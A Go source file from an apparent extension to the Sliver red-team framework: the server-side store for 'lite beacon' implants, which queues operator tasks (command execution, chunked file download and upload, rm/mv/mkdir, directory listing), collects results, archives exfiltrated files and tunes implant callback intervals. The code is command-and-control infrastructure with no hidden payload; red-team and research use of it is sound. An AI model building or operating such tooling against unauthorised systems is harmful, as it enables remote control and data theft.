package litebeacon

import (
	"sort"
	"sync"
	"time"

	"github.com/bishopfox/sliver/server/log"
)

var storeLog = log.NamedLogger("litebeacon", "store")

const (
	maxQueuedTasks  = 32
	maxResults      = 32
	maxResultBytes  = 1 << 20
	maxRecentNonces = 64
	maxFileBytes    = fileMaxSize
	maxFileJobs     = 4

	// Adaptive-interval policy (all clamped to [minIntervalSec, maxIntervalSec]).
	defaultIdleIntervalSec uint32 = 10
	defaultFastIntervalSec uint32 = 10
	minIntervalSec         uint32 = 5
	maxIntervalSec         uint32 = 86400
	activeWindow                  = 5 * time.Minute
)

// Beacon is the console-facing view of a known implant.
type Beacon struct {
	ID           string     `json:"ID"`
	Info         BeaconInfo `json:"Info"`
	SecretB64    string     `json:"SecretB64"`
	FirstSeen    time.Time  `json:"FirstSeen"`
	LastSeen     time.Time  `json:"LastSeen"`
	IntervalSec  uint32     `json:"IntervalSec"`  // 当前下发给植入体的回连间隔
	IdleSec      uint32     `json:"IdleSec"`      // 监听器空闲档
	FastSec      uint32     `json:"FastSec"`      // 监听器干活档
	Active       bool       `json:"Active"`       // 操作员活跃窗口内
	Queued       int        `json:"Queued"`       // 待下发任务数
	BaseInterval uint32     `json:"BaseInterval"` // sleep 任务设定的单信标基准；0=用空闲档
}

// Result is a completed task outcome, consumed by the console on read.
type Result struct {
	BeaconID string    `json:"BeaconID"`
	Kind     string    `json:"Kind"` // "exec" / "read" / "fs"
	TaskID   uint32    `json:"TaskID"`
	Exit     int32     `json:"Exit"`
	Err      uint8     `json:"Err"`
	Output   []byte    `json:"Output"`
	Path     string    `json:"Path,omitempty"`
	Total    uint32    `json:"Total,omitempty"`
	Op       string    `json:"Op,omitempty"` // fs: write / rm / mv / mkdir
	Dst      string    `json:"Dst,omitempty"`
	Msg      string    `json:"Msg,omitempty"`
	At       time.Time `json:"At"`
}

type fileJob struct {
	taskID uint32
	path   string
	buf    []byte
	total  uint32
	next   uint32
}

// DirListing is the console-facing view of one remote directory.
type DirListing struct {
	Path      string     `json:"Path"`
	Err       uint8      `json:"Err"`
	Truncated bool       `json:"Truncated"`
	Entries   []DirEntry `json:"Entries"`
	At        time.Time  `json:"At"`
}

// OnCompletedFile is set by the web layer; every fully downloaded file is
// handed to it so the console can keep an archive. Called outside the store
// lock; the callback must not re-enter the store.
var OnCompletedFile func(beaconID string, taskID uint32, path string, data []byte)

// OnFsResult is set by the web layer to record every completed fs operation
// (write/rm/mv/mkdir) into the operator audit trail.
var OnFsResult func(beaconID, op, path, dst string, errCode uint8, msg string)

type dirPending struct {
	path string
	at   time.Time
}

// writeJob tracks a server->implant upload across heartbeats.
type writeJob struct {
	taskID      uint32
	path        string
	data        []byte
	total       uint64
	next        uint32 // bytes acknowledged by the implant
	expectSize  int64
	expectMTime int64
	force       bool
	startedAt   time.Time
}

// fsEvent is an fs op completion collected for the audit hook.
type fsEvent struct {
	op, path, dst string
	errCode       uint8
	msg           string
}

// fsPendingEntry maps an in-flight fs task to its job/op for ack routing.
type fsPendingEntry struct {
	op     string // write / rm / mv / mkdir
	path   string
	dst    string
	jobID  uint32 // write only
	offset uint32 // write only: chunk start
	sent   uint32 // write only: chunk length
	at     time.Time
}

const (
	fsOpTTL = 5 * time.Minute // unanswered fs op is aborted so it can be retried
)

const (
	dirListCacheTTL   = 60 * time.Second  // fresh listing is reused without touching the implant
	dirListPendingTTL = 120 * time.Second // unanswered listing requests expire so they can be retried
	maxCachedDirs     = 32
)

type beaconState struct {
	info            BeaconInfo
	secretB64       string
	firstSeen       time.Time
	lastSeen        time.Time
	baseIntervalSec uint32 // sleep 任务设定的单信标基准；0 = 走监听器空闲策略
	lastActive      time.Time
	tasks           []Task
	results         []Result
	resultBytes     int
	files           map[uint32]*fileJob
	lsCache         map[string]*DirListing
	lsPending       map[uint32]dirPending // taskID -> requested path + request time
	fsPending       map[uint32]fsPendingEntry
	writeJobs       map[uint32]*writeJob
	nonces          map[string]struct{}
	nonceOrder      []string
}

// Store holds all lite beacon state in memory.
type Store struct {
	mutex        sync.Mutex
	beacons      map[string]*beaconState
	taskSeq      uint32
	idleInterval uint32 // 空闲（无操作员活动）时的回连间隔
	fastInterval uint32 // 操作员活跃窗口内的回连间隔
	nowFn        func() time.Time
}

func NewStore() *Store {
	return &Store{
		beacons:      map[string]*beaconState{},
		idleInterval: defaultIdleIntervalSec,
		fastInterval: defaultFastIntervalSec,
		nowFn:        time.Now,
	}
}

// SetIntervalPolicy sets the listener-level idle/fast intervals (clamped).
func (s *Store) SetIntervalPolicy(idleSec, fastSec uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.idleInterval = clampInterval(idleSec, defaultIdleIntervalSec)
	s.fastInterval = clampInterval(fastSec, defaultFastIntervalSec)
}

func clampInterval(sec, fallback uint32) uint32 {
	if sec == 0 {
		return fallback
	}
	if sec < minIntervalSec {
		return minIntervalSec
	}
	if sec > maxIntervalSec {
		return maxIntervalSec
	}
	return sec
}

// SetBaseInterval records a per-beacon base interval (from a sleep task).
func (s *Store) SetBaseInterval(id string, sec uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	if st, ok := s.beacons[id]; ok && sec > 0 {
		st.baseIntervalSec = clampInterval(sec, 0)
	}
}

// NextInterval returns the interval hint for the implant's next sleep:
// fast while the operator is in an active window, otherwise the beacon's
// base (or the listener idle policy when no base was set).
func (s *Store) NextInterval(id string) uint32 {
	sec, _ := s.IntervalHint(id)
	return sec
}

// IntervalHint returns the next sleep base and whether the implant must
// sleep that many seconds exactly. exact is true only in the operator's
// active window; idle sleeps are jittered by the implant.
func (s *Store) IntervalHint(id string) (sec uint32, exact bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	now := s.nowFn()
	st, ok := s.beacons[id]
	exact = ok && !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow
	return s.nextIntervalLocked(id, now), exact
}

func (s *Store) nextIntervalLocked(id string, now time.Time) uint32 {
	st, ok := s.beacons[id]
	if ok && !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow {
		return s.fastInterval
	}
	if ok && st.baseIntervalSec > 0 {
		return st.baseIntervalSec
	}
	return s.idleInterval
}

// Touch upserts the beacon, refreshes last-seen and enforces the replay
// window. It returns true when the nonce was already seen (reject the call).
func (s *Store) Touch(id string, nonce []byte, info *BeaconInfo, secretB64 string, now time.Time) (replayed bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		st = &beaconState{nonces: map[string]struct{}{}, files: map[uint32]*fileJob{}}
		st.lsCache = map[string]*DirListing{}
		st.lsPending = map[uint32]dirPending{}
		st.firstSeen = now
		st.info.ID = id
		s.beacons[id] = st
	}
	nonceKey := string(nonce)
	if _, dup := st.nonces[nonceKey]; dup {
		return true
	}
	st.nonces[nonceKey] = struct{}{}
	st.nonceOrder = append(st.nonceOrder, nonceKey)
	if len(st.nonceOrder) > maxRecentNonces {
		delete(st.nonces, st.nonceOrder[0])
		st.nonceOrder = st.nonceOrder[1:]
	}
	if info != nil {
		merged := *info
		merged.ID = id
		st.info = merged
	}
	st.secretB64 = secretB64
	st.lastSeen = now
	return false
}

func (s *Store) Has(id string) bool {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	_, ok := s.beacons[id]
	return ok
}

// QueueTask assigns the task an ID and queues it for the next check-in.
// It fails (ok=false) when the beacon is unknown, or when a read/write is
// refused because this beacon already has maxFileJobs transfers.
func (s *Store) QueueTask(id string, t Task) (Task, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return t, false
	}
	now := s.nowFn()
	if st.files == nil {
		st.files = map[uint32]*fileJob{}
	}
	if st.fsPending == nil {
		st.fsPending = map[uint32]fsPendingEntry{}
	}
	if st.writeJobs == nil {
		st.writeJobs = map[uint32]*writeJob{}
	}
	switch t.Type {
	case TaskRead:
		if len(st.files) >= maxFileJobs {
			storeLog.Warnf("beacon %s already has %d file transfers", id, len(st.files))
			return t, false
		}
		s.taskSeq++
		t.ID = s.taskSeq
		st.files[t.ID] = &fileJob{taskID: t.ID, path: t.Path}
		st.tasks = append(st.tasks, t)
	case TaskWrite:
		if len(t.Data) > maxFileBytes {
			storeLog.Warnf("beacon %s write of %d bytes exceeds cap", id, len(t.Data))
			return t, false
		}
		if len(st.files)+len(st.writeJobs) >= maxFileJobs {
			storeLog.Warnf("beacon %s already has %d transfers", id, len(st.files)+len(st.writeJobs))
			return t, false
		}
		s.taskSeq++
		t.ID = s.taskSeq
		job := &writeJob{
			taskID:      t.ID,
			path:        t.Path,
			data:        t.Data,
			total:       uint64(len(t.Data)),
			expectSize:  t.ExpectSize,
			expectMTime: t.ExpectMTime,
			force:       t.Force,
			startedAt:   now,
		}
		st.writeJobs[t.ID] = job
		s.queueWriteChunkLocked(st, job, 0, now)
	case TaskListDir:
		if st.lsPending == nil {
			st.lsPending = map[uint32]dirPending{}
		}
		s.taskSeq++
		t.ID = s.taskSeq
		st.lsPending[t.ID] = dirPending{path: t.Path, at: now}
		st.tasks = append(st.tasks, t)
	case TaskRm, TaskMv, TaskMkdir:
		s.taskSeq++
		t.ID = s.taskSeq
		st.fsPending[t.ID] = fsPendingEntry{op: map[byte]string{
			TaskRm: "rm", TaskMv: "mv", TaskMkdir: "mkdir",
		}[t.Type], path: t.Path, dst: t.Dst, at: now}
		st.tasks = append(st.tasks, t)
	default:
		s.taskSeq++
		t.ID = s.taskSeq
		st.tasks = append(st.tasks, t)
	}
	st.lastActive = now // 操作员在干活 → 进入活跃窗口
	if len(st.tasks) > maxQueuedTasks {
		dropN := len(st.tasks) - maxQueuedTasks
		now2 := s.nowFn()
		for _, dropped := range st.tasks[:dropN] {
			switch dropped.Type {
			case TaskRead:
				if job, ok := st.files[dropped.ID]; ok {
					delete(st.files, dropped.ID)
					st.results = append(st.results, Result{
						BeaconID: id, Kind: "read", TaskID: dropped.ID, Err: 4, Path: job.path, At: now2,
					})
				}
			case TaskListDir:
				if st.lsPending != nil {
					delete(st.lsPending, dropped.ID)
				}
			case TaskWrite:
				if pe, ok := st.fsPending[dropped.ID]; ok {
					delete(st.fsPending, dropped.ID)
					delete(st.writeJobs, pe.jobID)
					st.results = append(st.results, Result{
						BeaconID: id, Kind: "fs", Op: "write", TaskID: dropped.ID, Err: 8, Msg: "队列太长，任务被丢弃", Path: pe.path, At: now2,
					})
				}
			case TaskRm, TaskMv, TaskMkdir:
				if pe, ok := st.fsPending[dropped.ID]; ok {
					delete(st.fsPending, dropped.ID)
					st.results = append(st.results, Result{
						BeaconID: id, Kind: "fs", Op: pe.op, TaskID: dropped.ID, Err: 8, Msg: "队列太长，任务被丢弃", Path: pe.path, Dst: pe.dst, At: now2,
					})
				}
			}
		}
		st.tasks = st.tasks[dropN:]
		storeLog.Warnf("beacon %s task queue full: dropped %d oldest tasks", id, dropN)
	}
	return t, true
}

// queueWriteChunkLocked hands the implant one 48KB piece of a write job.
func (s *Store) queueWriteChunkLocked(st *beaconState, job *writeJob, offset uint32, now time.Time) {
	if uint64(offset) >= job.total {
		return
	}
	n := uint32(fileChunkSize)
	if uint64(n) > job.total-uint64(offset) {
		n = uint32(job.total - uint64(offset))
	}
	s.taskSeq++
	ct := Task{
		ID:          s.taskSeq,
		Type:        TaskWrite,
		Path:        job.path,
		Offset:      offset,
		Total:       job.total,
		ExpectSize:  job.expectSize,
		ExpectMTime: job.expectMTime,
		Force:       job.force,
		Data:        job.data[int(offset) : int(offset)+int(n)],
	}
	st.fsPending[ct.ID] = fsPendingEntry{op: "write", path: job.path, jobID: job.taskID, offset: offset, sent: n, at: now}
	st.tasks = append(st.tasks, ct)
}

func (s *Store) TakeTasks(id string) []Task {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return nil
	}
	tasks := st.tasks
	st.tasks = nil
	return tasks
}

func (s *Store) Delete(id string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.beacons, id)
}

func (s *Store) PushResults(id string, execs []ExecResult, files []FileResult, dirs []DirResult, statuses []StatusResult, now time.Time) {
	type deliveredFile struct {
		taskID uint32
		path   string
		data   []byte
	}
	var done []deliveredFile
	var events []fsEvent

	s.mutex.Lock()
	st, ok := s.beacons[id]
	if !ok {
		s.mutex.Unlock()
		return
	}
	push := func(r Result) {
		st.results = append(st.results, r)
		st.resultBytes += resultWeight(r)
		for len(st.results) > maxResults {
			st.resultBytes -= resultWeight(st.results[0])
			st.results = st.results[1:]
		}
		for st.resultBytes > maxResultBytes {
			idx := -1
			for i, item := range st.results {
				if resultWeight(item) > 0 {
					idx = i
					break
				}
			}
			if idx < 0 {
				break
			}
			st.resultBytes -= resultWeight(st.results[idx])
			st.results = append(st.results[:idx], st.results[idx+1:]...)
		}
	}
	s.sweepStaleLocked(st, id, push, now, &events)
	for _, e := range execs {
		push(Result{BeaconID: id, Kind: "exec", TaskID: e.TaskID, Exit: e.Exit, Output: e.Output, At: now})
	}
	for _, f := range files {
		if path, data, complete := s.ingestFileLocked(st, id, f, now, push); complete {
			done = append(done, deliveredFile{taskID: f.TaskID, path: path, data: data})
		}
	}
	for _, d := range dirs {
		s.ingestDirLocked(st, d, now)
	}
	for _, sr := range statuses {
		s.ingestStatusLocked(st, id, sr, now, push, &events)
	}
	s.mutex.Unlock()

	// 留档/审计回调放在锁外，慢磁盘不能拖住其他信标。
	for _, item := range done {
		if OnCompletedFile != nil {
			OnCompletedFile(id, item.taskID, item.path, item.data)
		}
	}
	for _, ev := range events {
		if OnFsResult != nil {
			OnFsResult(id, ev.op, ev.path, ev.dst, ev.errCode, ev.msg)
		}
	}
}

// sweepStaleLocked aborts fs operations that never got an answer, so the
// operator can retry instead of staring at a stuck job.
func (s *Store) sweepStaleLocked(st *beaconState, id string, push func(Result), now time.Time, events *[]fsEvent) {
	if st.fsPending == nil {
		return
	}
	for taskID, pe := range st.fsPending {
		if now.Sub(pe.at) < fsOpTTL {
			continue
		}
		delete(st.fsPending, taskID)
		if pe.op == "write" {
			delete(st.writeJobs, pe.jobID)
		}
		msg := "植入体长时间没有回应，任务作废"
		push(Result{BeaconID: id, Kind: "fs", Op: pe.op, TaskID: taskID, Err: 8, Msg: msg, Path: pe.path, Dst: pe.dst, At: now})
		*events = append(*events, fsEvent{op: pe.op, path: pe.path, dst: pe.dst, errCode: 8, msg: msg})
	}
}

// ingestStatusLocked routes an implant ack for a write/rm/mv/mkdir task:
// write acks advance the chunked upload (queuing the next piece), everything
// else completes in one step. Every outcome is pushed as a Result kind "fs".
func (s *Store) ingestStatusLocked(st *beaconState, id string, sr StatusResult, now time.Time, push func(Result), events *[]fsEvent) {
	if st.fsPending == nil {
		return
	}
	pe, ok := st.fsPending[sr.TaskID]
	if !ok {
		return
	}
	delete(st.fsPending, sr.TaskID)
	emit := func(errCode uint8, msg string) {
		push(Result{BeaconID: id, Kind: "fs", Op: pe.op, TaskID: sr.TaskID, Err: errCode, Msg: msg, Path: pe.path, Dst: pe.dst, At: now})
		*events = append(*events, fsEvent{op: pe.op, path: pe.path, dst: pe.dst, errCode: errCode, msg: msg})
	}
	if sr.Err != 0 {
		if pe.op == "write" {
			delete(st.writeJobs, pe.jobID)
		}
		emit(sr.Err, sr.Msg)
		return
	}
	if pe.op != "write" {
		emit(0, "")
		return
	}
	job, ok := st.writeJobs[pe.jobID]
	if !ok {
		return
	}
	job.next = pe.offset + pe.sent
	if uint64(job.next) < job.total {
		s.queueWriteChunkLocked(st, job, job.next, now)
		return
	}
	delete(st.writeJobs, pe.jobID)
	emit(0, "")
}

func (s *Store) ingestFileLocked(st *beaconState, id string, f FileResult, now time.Time, push func(Result)) (path string, data []byte, complete bool) {
	job, ok := st.files[f.TaskID]
	if !ok {
		job = &fileJob{taskID: f.TaskID}
		if st.files == nil {
			st.files = map[uint32]*fileJob{}
		}
		st.files[f.TaskID] = job
	}
	fail := func(code uint8) {
		delete(st.files, f.TaskID)
		n := 0
		for _, task := range st.tasks {
			if task.Type == TaskRead && task.ID == f.TaskID {
				continue
			}
			st.tasks[n] = task
			n++
		}
		st.tasks = st.tasks[:n]
		push(Result{BeaconID: id, Kind: "read", TaskID: f.TaskID, Err: code, Path: job.path, At: now})
	}
	if f.Err != 0 {
		fail(f.Err)
		return "", nil, false
	}
	if !f.Chunked {
		delete(st.files, f.TaskID)
		push(Result{BeaconID: id, Kind: "read", TaskID: f.TaskID, Output: f.Content, Path: job.path, Total: uint32(len(f.Content)), At: now})
		return job.path, f.Content, true
	}
	if f.Total > maxFileBytes {
		fail(3)
		return "", nil, false
	}
	if f.Offset < f.Total && len(f.Content) == 0 {
		fail(4)
		return "", nil, false
	}
	if job.total == 0 {
		job.total = f.Total
		if f.Total > 0 {
			job.buf = make([]byte, f.Total)
		}
	}
	if f.Total != job.total || f.Offset != job.next || f.Offset > job.total {
		fail(4)
		return "", nil, false
	}
	end := f.Offset + uint32(len(f.Content))
	if end > job.total {
		fail(4)
		return "", nil, false
	}
	if len(f.Content) > 0 {
		copy(job.buf[f.Offset:end], f.Content)
	}
	job.next = end
	if job.next < job.total {
		st.tasks = append(st.tasks, Task{ID: job.taskID, Type: TaskRead, Path: job.path, Offset: job.next})
		st.lastActive = now
		return "", nil, false
	}
	out := job.buf
	if out == nil {
		out = []byte{}
	}
	total := job.total
	delete(st.files, f.TaskID)
	push(Result{BeaconID: id, Kind: "read", TaskID: f.TaskID, Output: out, Path: job.path, Total: total, At: now})
	return job.path, out, true
}

// ingestDirLocked files a directory listing into the per-beacon cache keyed by
// the path that was requested; unknown task IDs (queue overflow, stale) are dropped.
func (s *Store) ingestDirLocked(st *beaconState, d DirResult, now time.Time) {
	if st.lsPending == nil {
		return
	}
	path := st.lsPending[d.TaskID].path
	if _, has := st.lsPending[d.TaskID]; !has {
		return
	}
	delete(st.lsPending, d.TaskID)
	if st.lsCache == nil {
		st.lsCache = map[string]*DirListing{}
	}
	st.lsCache[path] = &DirListing{
		Path:      path,
		Err:       d.Err,
		Truncated: d.Truncated,
		Entries:   d.Entries,
		At:        now,
	}
	for len(st.lsCache) > maxCachedDirs {
		oldestKey := ""
		var oldest time.Time
		for key, item := range st.lsCache {
			if oldestKey == "" || item.At.Before(oldest) {
				oldestKey, oldest = key, item.At
			}
		}
		if oldestKey == "" {
			break
		}
		delete(st.lsCache, oldestKey)
	}
}

// RequestDir queues a directory listing for the beacon. It returns
// (queued, pending): queued means a fresh task was enqueued, pending means a
// recent request for the same path is already in flight; fresh cache counts as
// neither (the caller can just read it).
func (s *Store) RequestDir(id, path string, force bool) (queued bool, pending bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return false, false
	}
	now := s.nowFn()
	if !force {
		if c := st.lsCache[path]; c != nil && now.Sub(c.At) < dirListCacheTTL {
			return false, false
		}
		if st.pathPendingLocked(path, now) {
			return false, true
		}
	}
	if st.lsPending == nil {
		st.lsPending = map[uint32]dirPending{}
	}
	s.taskSeq++
	t := Task{ID: s.taskSeq, Type: TaskListDir, Path: path}
	st.lsPending[t.ID] = dirPending{path: path, at: now}
	st.tasks = append(st.tasks, t)
	st.lastActive = now
	return true, false
}

// DirStatus returns the cached listing (if any) and whether a request for this
// path is still in flight.
func (s *Store) DirStatus(id, path string) (DirListing, bool, bool) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return DirListing{}, false, false
	}
	listing, found := st.lsCache[path]
	if !found || listing == nil {
		return DirListing{}, false, st.pathPendingLocked(path, s.nowFn())
	}
	return *listing, true, st.pathPendingLocked(path, s.nowFn())
}

func (st *beaconState) pathPendingLocked(path string, now time.Time) bool {
	if st.lsPending == nil {
		return false
	}
	for _, p := range st.lsPending {
		if p.path == path && now.Sub(p.at) < dirListPendingTTL {
			return true
		}
	}
	return false
}

func resultWeight(r Result) int {
	if r.Kind == "read" {
		return 0
	}
	return len(r.Output)
}

func (s *Store) TakeResults(id string) []Result {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	st, ok := s.beacons[id]
	if !ok {
		return nil
	}
	results := st.results
	st.results = nil
	st.resultBytes = 0
	return results
}

// IntervalPolicy returns the current listener-level idle/fast intervals.
func (s *Store) IntervalPolicy() (idle, fast uint32) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	return s.idleInterval, s.fastInterval
}

func (s *Store) ListBeacons() []Beacon {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	now := s.nowFn()
	out := make([]Beacon, 0, len(s.beacons))
	for id, st := range s.beacons {
		active := !st.lastActive.IsZero() && now.Sub(st.lastActive) < activeWindow
		out = append(out, Beacon{
			ID:           id,
			Info:         st.info,
			SecretB64:    st.secretB64,
			FirstSeen:    st.firstSeen,
			LastSeen:     st.lastSeen,
			IntervalSec:  s.nextIntervalLocked(id, now),
			IdleSec:      s.idleInterval,
			FastSec:      s.fastInterval,
			Active:       active,
			Queued:       len(st.tasks),
			BaseInterval: st.baseIntervalSec,
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].LastSeen.After(out[j].LastSeen) })
	return out
}
